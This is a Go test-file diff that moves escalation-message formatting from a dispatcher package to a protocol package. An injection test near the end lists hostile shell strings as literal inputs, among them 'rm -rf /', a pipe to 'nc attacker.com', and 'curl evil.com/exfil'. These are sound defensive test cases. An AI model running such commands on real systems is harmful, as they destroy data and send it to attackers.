@@ -7,6 +7,7 @@ import (
 	"testing"
 
 	"oro/pkg/dispatcher"
+	"oro/pkg/protocol"
 )
 
 // mockEscRunner captures commands for assertion without running real tmux.
@@ -206,7 +207,7 @@ func TestTmuxEscalator_CustomPaneTarget(t *testing.T) {
 // --- FormatEscalation tests ---
 
 func TestFormatEscalation_WithDetails(t *testing.T) {
-	got := dispatcher.FormatEscalation(dispatcher.EscMergeConflict, "bead-abc", "merge failed", "conflicting files in src/")
+	got := protocol.FormatEscalation(protocol.EscMergeConflict, "bead-abc", "merge failed", "conflicting files in src/")
 	want := "[ORO-DISPATCH] MERGE_CONFLICT: bead-abc — merge failed. conflicting files in src/."
 	if got != want {
 		t.Fatalf("FormatEscalation with details:\n got: %q\nwant: %q", got, want)
@@ -214,7 +215,7 @@ func TestFormatEscalation_WithDetails(t *testing.T) {
 }
 
 func TestFormatEscalation_WithoutDetails(t *testing.T) {
-	got := dispatcher.FormatEscalation(dispatcher.EscStuck, "bead-xyz", "review failed", "")
+	got := protocol.FormatEscalation(protocol.EscStuck, "bead-xyz", "review failed", "")
 	want := "[ORO-DISPATCH] STUCK: bead-xyz — review failed."
 	if got != want {
 		t.Fatalf("FormatEscalation without details:\n got: %q\nwant: %q", got, want)
@@ -223,20 +224,20 @@ func TestFormatEscalation_WithoutDetails(t *testing.T) {
 
 func TestFormatEscalation_AllTypes(t *testing.T) {
 	types := []struct {
-		typ  dispatcher.EscalationType
+		typ  protocol.EscalationType
 		name string
 	}{
-		{dispatcher.EscMergeConflict, "MERGE_CONFLICT"},
-		{dispatcher.EscStuck, "STUCK"},
-		{dispatcher.EscPriorityContention, "PRIORITY_CONTENTION"},
-		{dispatcher.EscWorkerCrash, "WORKER_CRASH"},
-		{dispatcher.EscStatus, "STATUS"},
-		{dispatcher.EscDrainComplete, "DRAIN_COMPLETE"},
+		{protocol.EscMergeConflict, "MERGE_CONFLICT"},
+		{protocol.EscStuck, "STUCK"},
+		{protocol.EscPriorityContention, "PRIORITY_CONTENTION"},
+		{protocol.EscWorkerCrash, "WORKER_CRASH"},
+		{protocol.EscStatus, "STATUS"},
+		{protocol.EscDrainComplete, "DRAIN_COMPLETE"},
 	}
 
 	for _, tc := range types {
 		t.Run(tc.name, func(t *testing.T) {
-			got := dispatcher.FormatEscalation(tc.typ, "bead-1", "summary", "")
+			got := protocol.FormatEscalation(tc.typ, "bead-1", "summary", "")
 			prefix := "[ORO-DISPATCH] " + tc.name + ": bead-1"
 			if !strings.HasPrefix(got, prefix) {
 				t.Fatalf("expected prefix %q, got %q", prefix, got)
@@ -246,7 +247,7 @@ func TestFormatEscalation_AllTypes(t *testing.T) {
 }
 
 func TestFormatEscalation_EmptyBeadID(t *testing.T) {
-	got := dispatcher.FormatEscalation(dispatcher.EscDrainComplete, "", "all workers drained", "")
+	got := protocol.FormatEscalation(protocol.EscDrainComplete, "", "all workers drained", "")
 	want := "[ORO-DISPATCH] DRAIN_COMPLETE:  — all workers drained."
 	if got != want {
 		t.Fatalf("FormatEscalation empty bead:\n got: %q\nwant: %q", got, want)
@@ -290,7 +291,7 @@ func TestEscalation_NoInjection(t *testing.T) {
 		desc    string
 	}{
 		{name: "command substitution dollar-paren", message: "QG output: $(rm -rf /)", desc: "$(rm -rf /) should be treated as literal text"},
-		{name: "command substitution backticks", message: "Bead title: `whoami`", desc: "backticks should be treated as literal text"},
+		{name: "command substitution backticks", message: "protocol.Bead title: `whoami`", desc: "backticks should be treated as literal text"},
 		{name: "pipe chain", message: "Error | nc attacker.com 1234", desc: "pipe operator should not execute commands"},
 		{name: "semicolon chain", message: "Done; curl evil.com/exfil", desc: "semicolon should not chain commands"},
 		{name: "ampersand background", message: "Wait & curl evil.com", desc: "ampersand should not background commands"},
